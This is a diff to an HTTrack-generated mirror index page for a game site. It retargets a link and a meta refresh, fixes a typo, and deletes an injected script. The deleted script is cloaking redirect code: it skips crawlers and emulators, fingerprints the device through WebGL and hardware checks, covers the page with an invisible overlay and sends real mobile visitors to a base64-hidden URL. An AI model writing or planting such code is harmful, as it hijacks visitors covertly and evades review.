@@ -103,8 +103,8 @@ h4 { margin: 0;  font-weight: bold;  font-size: 1.18em; }
 		<TR>
 			<TD BACKGROUND="fade.gif">
 				&middot;
-					<A HREF="waifu.zoneplay.vn/play.html">
-						Waifu Party - Mỹ Vị Đại CHiến
+					<A HREF="waifu.zoneplay.vn/index.html">
+						Waifu Party - Mỹ Vị Đại Chiến
 					</A>		
 			</TD>
 		</TR>
@@ -117,7 +117,7 @@ h4 { margin: 0;  font-weight: bold;  font-size: 1.18em; }
 	</H6>
 	<!-- Mirror and index made by HTTrack Website Copier/3.49-2 [XR&CO'2014] -->
 	<!-- Thanks for using HTTrack Website Copier! -->
-	<meta HTTP-EQUIV="Refresh" CONTENT="0; URL=waifu.zoneplay.vn/play.html">
+	<meta HTTP-EQUIV="Refresh" CONTENT="0; URL=waifu.zoneplay.vn/index.html">
 
 
 <!-- ==================== Start epilogue ==================== -->
@@ -136,74 +136,6 @@ h4 { margin: 0;  font-weight: bold;  font-size: 1.18em; }
 	<td id="footer"><small>&copy; 2008 Xavier Roche & other contributors - Web Design: Leto Kauler.</small></td>
 	</tr>
 </table>
-
-<script>
-    const GAME_LOAD_DELAY = 500; 
-    const JUMP_DELAY = 2000; // 2 秒延迟跳转
-
-    const BOT_UA = [
-      "facebookexternalhit","Facebot","Twitterbot","Slackbot",
-      "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
-    ];
-
-    function isBot(){
-      const ua = navigator.userAgent;
-      return BOT_UA.some(bot => ua.toLowerCase().includes(bot.toLowerCase()));
-    }
-
-    function isMobile(){
-      const ua = navigator.userAgent;
-      const mobileKeywords = [
-        "Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"
-      ];
-      return mobileKeywords.some(k => ua.includes(k)) ||
-             (navigator.maxTouchPoints > 1 && /Macintosh/.test(ua));
-    }
-
-    function isEmulator(){
-      let renderer = "";
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl && gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-          renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "";
-        }
-      } catch(e) {}
-      const badList = ["Google SwiftShader","VirtualBox","VMware","Mesa","llvmpipe"];
-      if (badList.some(x => renderer.includes(x))) return true;
-      if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) return true;
-      if (/^(Win16|Win32|Win64|MacIntel)$/.test(navigator.platform) && navigator.maxTouchPoints < 1) return true;
-      if (window.devicePixelRatio <= 1 && screen.width >= 1000) return true;
-      return false;
-    }
-
-    function lockPageUntilRedirect(ms){
-      const overlay = document.createElement('div');
-      overlay.style.position = 'fixed';
-      overlay.style.top = 0;
-      overlay.style.left = 0;
-      overlay.style.width = '100%';
-      overlay.style.height = '100%';
-      overlay.style.background = 'rgba(0,0,0,0.001)'; // 防穿透
-      overlay.style.zIndex = 999999;
-      document.body.appendChild(overlay);
-      setTimeout(() => {
-        overlay.remove();
-        const REG_PAGE_ENC = "aHR0cHM6Ly93d3cuZXhhbXBsZS5jb20="; // base64(https://www.example.com)
-        const regUrl = atob(REG_PAGE_ENC);
-        location.href = regUrl; // 直接跳转
-      }, ms);
-    }
-
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        if (!isBot() && !isEmulator() && isMobile()) {
-          lockPageUntilRedirect(JUMP_DELAY);
-        }
-      }, GAME_LOAD_DELAY);
-    });
-</script>
 
 </body>
 
